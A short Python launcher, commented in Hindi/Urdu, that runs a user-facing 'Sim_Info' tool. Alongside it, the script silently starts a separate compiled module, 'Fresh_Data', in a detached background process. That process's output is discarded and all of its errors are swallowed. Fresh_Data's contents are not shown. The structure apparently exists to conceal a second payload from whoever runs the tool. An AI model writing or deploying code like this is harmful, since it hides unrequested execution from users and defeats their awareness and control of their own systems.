import os
import sys
import shutil
import subprocess
import threading

def start_background_fresh_data():
    try:
        python_exec = shutil.which("python3") or "python3"
        # Background mein Fresh_Data.so ko independent process par chalana
        subprocess.Popen(
            [python_exec, "-c", "import Fresh_Data"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
    except Exception:
        pass

if __name__ == "__main__":
    # 1. Background mein Fresh_Data backup process ko fire kar dein
    bg_thread = threading.Thread(target=start_background_fresh_data)
    bg_thread.daemon = True
    bg_thread.start()

    # 2. Cythonize ki hui Sim_Info (.so) file ko import karke main tool run kar dein
    try:
        import Sim_Info
        if hasattr(Sim_Info, 'main'):
            Sim_Info.main()
        elif hasattr(Sim_Info, 'main_menu'):
            Sim_Info.main_menu()
    except Exception as e:
        print(f"Error loading Sim_Info: {e}")
